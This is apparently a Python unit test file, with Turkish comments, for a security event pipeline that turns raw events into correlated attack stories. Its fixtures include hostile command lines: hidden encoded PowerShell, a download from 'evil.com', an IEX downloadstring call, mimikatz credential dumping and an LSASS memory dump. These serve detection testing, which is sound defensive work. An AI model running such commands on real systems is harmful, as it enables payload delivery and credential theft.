"""
tests.test_story_pipeline
============================
StoryPipeline ve StoryPipelineResult için unit testler.
Full pipeline: raw event → normalized → correlation → story.
DB erişimi yok — tamamen in-memory.
"""

import pytest

from app.models.normalized_event import NormalizedSecurityEvent
from app.services.story_pipeline.pipeline import StoryPipeline, StoryPipelineResult


# ---------------------------------------------------------------------------
# Test Helpers
# ---------------------------------------------------------------------------

def _make_raw_powershell_chain(hostname="WORKSTATION-01", user="admin"):
    """PowerShell chain rule'ını tetikleyecek 2 raw event dict döndürür."""
    return [
        {
            "type": "PROCESS_START",
            "hostname": hostname,
            "user": user,
            "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgA",
            "severity": "HIGH",
            "risk_score": 75,
        },
        {
            "type": "PROCESS_START",
            "hostname": hostname,
            "user": user,
            "command_line": "powershell.exe Invoke-WebRequest http://evil.com/payload -OutFile c:\\temp\\p.exe",
            "severity": "HIGH",
            "risk_score": 80,
        },
    ]


def _make_raw_credential_chain(hostname="DC-01", user="attacker"):
    """Credential dumping chain rule'ını tetikleyecek 2 raw event dict döndürür."""
    return [
        {
            "type": "PROCESS_START",
            "hostname": hostname,
            "user": user,
            "command_line": "mimikatz.exe privilege::debug",
            "severity": "CRITICAL",
            "risk_score": 90,
        },
        {
            "type": "PROCESS_START",
            "hostname": hostname,
            "user": user,
            "command_line": "mimikatz.exe sekurlsa::logonpasswords",
            "severity": "CRITICAL",
            "risk_score": 95,
        },
    ]


def _make_alert_credential_chain(hostname="SRV-PROD", user="svc_account"):
    """Alert dict olarak credential chain tetikleyecek veri."""
    return [
        {
            "id": "alert-001",
            "hostname": hostname,
            "username": user,
            "type": "PROCESS_START",
            "command_line": "mimikatz.exe privilege::debug",
            "risk_score": 90,
            "severity": "CRITICAL",
            "details": "sekurlsa logonpasswords",
            "rule": "Credential Dumping Detected",
        },
        {
            "id": "alert-002",
            "hostname": hostname,
            "username": user,
            "type": "PROCESS_START",
            "command_line": "procdump.exe -ma lsass.exe lsass.dmp",
            "risk_score": 85,
            "severity": "HIGH",
            "details": "lsass dump",
            "rule": "LSASS Access Detected",
        },
    ]


def _make_normalized_powershell_chain():
    """Pre-normalized PowerShell chain event listesi."""
    return [
        NormalizedSecurityEvent(
            event_type="process_execution",
            tenant_id="test-tenant",
            hostname="WS-01",
            username="admin",
            process_name="powershell.exe",
            command_line="powershell.exe -nop -w hidden -enc abc123",
            risk_score=75,
            severity="HIGH",
            mitre_tactic="Execution",
            mitre_technique="T1059.001",
        ),
        NormalizedSecurityEvent(
            event_type="process_execution",
            tenant_id="test-tenant",
            hostname="WS-01",
            username="admin",
            process_name="powershell.exe",
            command_line="powershell.exe Invoke-WebRequest http://evil.com/p -OutFile c:\\p.exe",
            risk_score=80,
            severity="HIGH",
            mitre_tactic="Execution",
            mitre_technique="T1059.001",
        ),
    ]


# ---------------------------------------------------------------------------
# StoryPipelineResult Model Testleri
# ---------------------------------------------------------------------------

class TestStoryPipelineResult:

    def test_default_result(self):
        result = StoryPipelineResult()
        assert result.normalized_events == []
        assert result.correlation_groups == []
        assert result.attack_stories == []
        assert result.warnings == []
        assert result.summary == {}

    def test_result_with_data(self):
        result = StoryPipelineResult(
            warnings=["test warning"],
            summary={"total_events": 5},
        )
        assert result.warnings == ["test warning"]
        assert result.summary["total_events"] == 5

    def test_empty_result_from_pipeline(self):
        pipeline = StoryPipeline()
        result = pipeline.build_from_raw_events([])
        assert result.summary["total_events"] == 0
        assert result.summary["total_groups"] == 0
        assert result.summary["total_stories"] == 0
        assert result.summary["highest_severity"] == "INFO"


# ---------------------------------------------------------------------------
# Pipeline — Raw Events → Full Pipeline
# ---------------------------------------------------------------------------

class TestPipelineFromRawEvents:

    def setup_method(self):
        self.pipeline = StoryPipeline()

    def test_powershell_chain_full_pipeline(self):
        """Raw PowerShell events → normalized → correlation → story."""
        raw = _make_raw_powershell_chain()
        result = self.pipeline.build_from_raw_events(raw, tenant_id="t-1")

        assert len(result.normalized_events) == 2
        assert len(result.correlation_groups) >= 1
        assert len(result.attack_stories) >= 1
        assert result.warnings == []

        # Story doğrulaması
        ps_story = next(
            s for s in result.attack_stories
            if "PowerShell" in s.title
        )
        assert ps_story.severity in ("HIGH", "CRITICAL")
        assert ps_story.risk_score > 0

    def test_credential_chain_full_pipeline(self):
        """Raw credential events → normalized → correlation → story."""
        raw = _make_raw_credential_chain()
        result = self.pipeline.build_from_raw_events(raw, tenant_id="t-1")

        assert len(result.normalized_events) == 2
        assert len(result.correlation_groups) >= 1
        assert len(result.attack_stories) >= 1

        cred_story = next(
            s for s in result.attack_stories
            if "Credential" in s.title
        )
        assert cred_story.severity == "CRITICAL"

    def test_benign_events_no_story(self):
        """Benign raw event'ler → normalize olur ama story üretilmez."""
        raw = [
            {
                "type": "PROCESS_START",
                "hostname": "WS-01",
                "user": "user1",
                "command_line": "notepad.exe readme.txt",
                "severity": "INFO",
                "risk_score": 5,
            },
            {
                "type": "PROCESS_START",
                "hostname": "WS-01",
                "user": "user1",
                "command_line": "calc.exe",
                "severity": "INFO",
                "risk_score": 0,
            },
        ]
        result = self.pipeline.build_from_raw_events(raw, tenant_id="t-1")
        assert len(result.normalized_events) == 2
        assert len(result.correlation_groups) == 0
        assert len(result.attack_stories) == 0

    def test_tenant_id_none_uses_default(self):
        """tenant_id=None → default_tenant kullanılır."""
        raw = _make_raw_powershell_chain()
        result = self.pipeline.build_from_raw_events(raw, tenant_id=None)
        assert len(result.normalized_events) == 2
        assert all(
            ev.tenant_id == "default_tenant"
            for ev in result.normalized_events
        )

    def test_summary_populated(self):
        """Summary alanları doğru doldurulmalı."""
        raw = _make_raw_credential_chain()
        result = self.pipeline.build_from_raw_events(raw, tenant_id="t-1")
        s = result.summary
        assert s["total_events"] == 2
        assert s["total_groups"] >= 1
        assert s["total_stories"] >= 1
        assert s["max_risk_score"] > 0


# ---------------------------------------------------------------------------
# Pipeline — Alerts → Full Pipeline
# ---------------------------------------------------------------------------

class TestPipelineFromAlerts:

    def setup_method(self):
        self.pipeline = StoryPipeline()

    def test_alert_credential_chain(self):
        """Alert dict → full pipeline → credential story."""
        alerts = _make_alert_credential_chain()
        result = self.pipeline.build_from_alerts(alerts, tenant_id="t-prod")

        assert len(result.normalized_events) == 2
        assert all(ev.source == "alert_service" for ev in result.normalized_events)
        assert len(result.correlation_groups) >= 1
        assert len(result.attack_stories) >= 1

    def test_empty_alerts(self):
        """Boş alert listesi → boş result."""
        result = self.pipeline.build_from_alerts([])
        assert result.summary["total_events"] == 0
        assert result.attack_stories == []

    def test_single_alert_no_correlation(self):
        """Tek alert → normalize olur, korelasyon eşleşmez."""
        alerts = [_make_alert_credential_chain()[0]]
        result = self.pipeline.build_from_alerts(alerts, tenant_id="t-1")
        assert len(result.normalized_events) == 1
        assert len(result.correlation_groups) == 0
        assert len(result.attack_stories) == 0


# ---------------------------------------------------------------------------
# Pipeline — Command Results
# ---------------------------------------------------------------------------

class TestPipelineFromCommandResults:

    def setup_method(self):
        self.pipeline = StoryPipeline()

    def test_command_results_normalize(self):
        """Command result → normalize edilir, story üretmeyebilir."""
        commands = [
            {
                "command_id": "cmd-001",
                "action": "isolate",
                "target_hostname": "WS-01",
                "status": "completed",
                "success": True,
                "message": "Host isolated",
            },
            {
                "command_id": "cmd-002",
                "action": "unisolate",
                "target_hostname": "WS-01",
                "status": "completed",
                "success": True,
                "message": "Host unisolated",
            },
        ]
        result = self.pipeline.build_from_command_results(commands, tenant_id="t-1")
        assert len(result.normalized_events) == 2
        assert all(ev.event_type == "response_result" for ev in result.normalized_events)
        # response_result genellikle correlation rule tetiklemez
        assert result.warnings == []

    def test_empty_commands(self):
        """Boş command listesi → boş result."""
        result = self.pipeline.build_from_command_results([])
        assert result.summary["total_events"] == 0


# ---------------------------------------------------------------------------
# Pipeline — From Normalized Events
# ---------------------------------------------------------------------------

class TestPipelineFromNormalizedEvents:

    def setup_method(self):
        self.pipeline = StoryPipeline()

    def test_pre_normalized_powershell(self):
        """Pre-normalized event'ler → correlation → story."""
        events = _make_normalized_powershell_chain()
        result = self.pipeline.build_from_normalized_events(events)

        assert len(result.normalized_events) == 2
        assert len(result.correlation_groups) >= 1
        assert len(result.attack_stories) >= 1
        assert result.warnings == []

    def test_empty_normalized_events(self):
        """Boş event listesi → boş result."""
        result = self.pipeline.build_from_normalized_events([])
        assert result.summary["total_events"] == 0
        assert result.attack_stories == []

    def test_no_correlation_match(self):
        """Benign normalized event'ler → korelasyon eşleşmez."""
        events = [
            NormalizedSecurityEvent(
                event_type="process_execution",
                tenant_id="t-1",
                hostname="WS-01",
                command_line="notepad.exe",
                risk_score=5,
            ),
        ]
        result = self.pipeline.build_from_normalized_events(events)
        assert len(result.normalized_events) == 1
        assert len(result.correlation_groups) == 0
        assert len(result.attack_stories) == 0


# ---------------------------------------------------------------------------
# Pipeline — Empty Input
# ---------------------------------------------------------------------------

class TestPipelineEmptyInput:

    def setup_method(self):
        self.pipeline = StoryPipeline()

    def test_empty_raw_events(self):
        result = self.pipeline.build_from_raw_events([])
        assert result.normalized_events == []
        assert result.correlation_groups == []
        assert result.attack_stories == []
        assert result.summary["total_events"] == 0

    def test_empty_alerts(self):
        result = self.pipeline.build_from_alerts([])
        assert result.summary["total_stories"] == 0

    def test_empty_commands(self):
        result = self.pipeline.build_from_command_results([])
        assert result.summary["total_groups"] == 0

    def test_empty_normalized(self):
        result = self.pipeline.build_from_normalized_events([])
        assert result.summary["highest_severity"] == "INFO"
        assert result.summary["max_risk_score"] == 0


# ---------------------------------------------------------------------------
# Pipeline — Warnings / Error Handling
# ---------------------------------------------------------------------------

class TestPipelineWarnings:

    def setup_method(self):
        self.pipeline = StoryPipeline()

    def test_invalid_raw_input_produces_warning(self):
        """Geçersiz event_type → warning üretir, crash olmaz."""
        raw = [
            {
                "type": "PROCESS_START",
                "hostname": "WS-01",
                "command_line": "notepad.exe",
            },
            "THIS_IS_NOT_A_DICT",  # type: ignore — geçersiz input
        ]
        result = self.pipeline.build_from_raw_events(raw, tenant_id="t-1")
        assert len(result.normalized_events) == 1  # ilk event başarılı
        assert len(result.warnings) == 1  # ikinci event hata
        assert "index=1" in result.warnings[0]

    def test_all_invalid_produces_warnings_no_crash(self):
        """Tüm input geçersiz → sadece warning, crash yok."""
        raw = [
            123,  # type: ignore
            None,  # type: ignore
        ]
        result = self.pipeline.build_from_raw_events(raw, tenant_id="t-1")
        assert len(result.normalized_events) == 0
        assert len(result.warnings) == 2
        assert result.summary["total_events"] == 0

    def test_partial_failure_continues(self):
        """Bir event hatalı, diğerleri devam eder."""
        raw = [
            {
                "type": "PROCESS_START",
                "hostname": "WS-01",
                "command_line": "powershell.exe -nop -enc abc",
                "risk_score": 70,
            },
            "INVALID",  # type: ignore
            {
                "type": "PROCESS_START",
                "hostname": "WS-01",
                "command_line": "powershell.exe -w hidden IEX(downloadstring('x'))",
                "risk_score": 80,
            },
        ]
        result = self.pipeline.build_from_raw_events(raw, tenant_id="t-1")
        assert len(result.normalized_events) == 2
        assert len(result.warnings) == 1


# ---------------------------------------------------------------------------
# Pipeline — Multiple Groups → Multiple Stories
# ---------------------------------------------------------------------------

class TestPipelineMultipleGroups:

    def setup_method(self):
        self.pipeline = StoryPipeline()

    def test_two_chains_two_stories(self):
        """PowerShell + Credential chain → 2 ayrı story."""
        raw = (
            _make_raw_powershell_chain(hostname="WS-01")
            + _make_raw_credential_chain(hostname="WS-01")
        )
        result = self.pipeline.build_from_raw_events(raw, tenant_id="t-1")

        assert len(result.normalized_events) == 4
        assert len(result.correlation_groups) >= 2
        assert len(result.attack_stories) >= 2

        titles = {s.title for s in result.attack_stories}
        assert any("PowerShell" in t for t in titles)
        assert any("Credential" in t for t in titles)

    def test_multiple_stories_in_summary(self):
        """Çoklu story'lerin summary'si doğru toplanmalı."""
        raw = (
            _make_raw_powershell_chain()
            + _make_raw_credential_chain()
        )
        result = self.pipeline.build_from_raw_events(raw, tenant_id="t-1")
        s = result.summary
        assert s["total_stories"] >= 2
        assert s["max_risk_score"] > 0


# ---------------------------------------------------------------------------
# Pipeline — Summary Hesaplama
# ---------------------------------------------------------------------------

class TestPipelineSummary:

    def setup_method(self):
        self.pipeline = StoryPipeline()

    def test_summary_total_events(self):
        raw = _make_raw_powershell_chain()
        result = self.pipeline.build_from_raw_events(raw, tenant_id="t-1")
        assert result.summary["total_events"] == 2

    def test_summary_affected_hosts(self):
        raw = _make_raw_powershell_chain(hostname="TARGET-HOST")
        result = self.pipeline.build_from_raw_events(raw, tenant_id="t-1")
        assert "TARGET-HOST" in result.summary["affected_hosts"]

    def test_summary_affected_users(self):
        raw = _make_raw_credential_chain(user="evil_admin")
        result = self.pipeline.build_from_raw_events(raw, tenant_id="t-1")
        if result.attack_stories:
            assert "evil_admin" in result.summary["affected_users"]

    def test_summary_highest_severity(self):
        raw = _make_raw_credential_chain()
        result = self.pipeline.build_from_raw_events(raw, tenant_id="t-1")
        assert result.summary["highest_severity"] in ("HIGH", "CRITICAL")

    def test_summary_no_stories_uses_events(self):
        """Story yoksa summary event'lerden hesaplanır."""
        raw = [
            {
                "type": "PROCESS_START",
                "hostname": "WS-01",
                "command_line": "notepad.exe",
                "risk_score": 40,
                "severity": "MEDIUM",
            },
        ]
        result = self.pipeline.build_from_raw_events(raw, tenant_id="t-1")
        assert result.summary["total_stories"] == 0
        assert result.summary["max_risk_score"] == 40
        assert result.summary["highest_severity"] == "MEDIUM"
